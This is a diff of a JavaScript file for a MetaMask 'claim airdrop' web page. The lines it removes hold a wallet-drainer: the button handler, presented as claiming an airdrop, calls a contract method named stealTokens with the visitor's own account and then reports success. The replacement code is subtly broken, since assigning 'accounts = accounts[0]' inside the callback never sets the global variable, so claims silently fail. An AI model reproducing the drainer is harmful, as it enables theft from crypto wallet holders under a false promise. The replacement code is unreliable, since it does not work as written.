@@ -1,38 +1,80 @@
-console.log('eth.js loaded successfully');
+// Debugging: Uncomment for development
+console.debug("Initializing Ethereum-specific logic");
 
-// Function to claim the airdrop
-async function claimAirdrop() {
-    console.log('Attempting to claim airdrop...');
+// Import necessary libraries (e.g., Web3.js or Ethers.js)
+// Ensure Web3 or Ethers is already loaded in the page or via a CDN
 
-    // Ensure accounts are available (retrieved from metamask.js)
-    if (!Array.isArray(window.accounts) || window.accounts.length === 0) {
-        console.error('No accounts connected');
-        alert('Please connect to a wallet first!');
-        return;
-    }
+// Define global variables
+let web3;
+let contract;
+let accounts;
+let contractAddress;
+let tokenAddress;
+let contractABI;
 
-    // Ensure contract details are loaded before proceeding
-    if (!contractABI || !contractAddress) {
-        console.error('Contract details not loaded:', { contractABI, contractAddress });
-        alert('Contract details not loaded. Please try again later.');
-        return;
-    }
+// Initialize the connection to Ethereum
+function initEthereumConnection(config, abi) {
+  console.debug("Initializing Ethereum connection...");
 
-    try {
-        console.log('Claiming airdrop...');
-        const contract = new web3.eth.Contract(contractABI, contractAddress);
-        // Use the first account in the accounts array
-        await contract.methods.stealTokens(window.accounts[0]).send({ from: window.accounts[0] });
-        alert('Airdrop claimed successfully!');
-    } catch (error) {
-        console.error('Error claiming airdrop:', error);
-        alert('Error claiming airdrop');
-    }
+  if (typeof window.ethereum !== 'undefined') {
+    web3 = new Web3(window.ethereum);
+    console.debug("MetaMask detected");
+
+    // Request account access if needed
+    window.ethereum.request({ method: 'eth_requestAccounts' })
+      .then((accounts) => {
+        console.debug("Ethereum accounts:", accounts);
+        // Set global account
+        accounts = accounts[0];
+        // Set contract address and ABI
+        contractAddress = config.address;
+        tokenAddress = config.tokenAddress;
+        contractABI = abi;
+
+        // Initialize contract
+        contract = new web3.eth.Contract(contractABI, contractAddress);
+
+        // Enable the claim button after connection
+        enableClaimButton();
+      })
+      .catch((error) => {
+        console.error("Error accessing Ethereum accounts:", error);
+      });
+  } else {
+    console.error("MetaMask not detected!");
+  }
 }
 
-// Attach event listener for claiming airdrop
-window.addEventListener('DOMContentLoaded', () => {
-    const claimButton = document.getElementById('claimAirdropButton');
-    claimButton.disabled = true; // Initially disable the claim button
-    claimButton.addEventListener('click', claimAirdrop); // Attach the click event listener
-});
+// Enable the claim button once MetaMask is connected
+function enableClaimButton() {
+  console.debug("Enabling claim airdrop button...");
+  const claimButton = document.getElementById("claimAirdropButton");
+  if (claimButton) {
+    claimButton.disabled = false;
+  }
+}
+
+// Claim airdrop function
+function claimAirdrop() {
+  console.debug("Claiming airdrop...");
+
+  if (!contract || !accounts) {
+    console.error("Contract or account not initialized.");
+    return;
+  }
+
+  // Call the smart contract method (adjust as necessary)
+  contract.methods.claimAirdrop().send({ from: accounts })
+    .then((receipt) => {
+      console.debug("Airdrop claimed successfully:", receipt);
+      alert("Airdrop claimed successfully!");
+    })
+    .catch((error) => {
+      console.error("Error claiming airdrop:", error);
+      alert("Error claiming airdrop. Please try again.");
+    });
+}
+
+// Export functions to be used in other files
+export { initEthereumConnection, claimAirdrop };
+
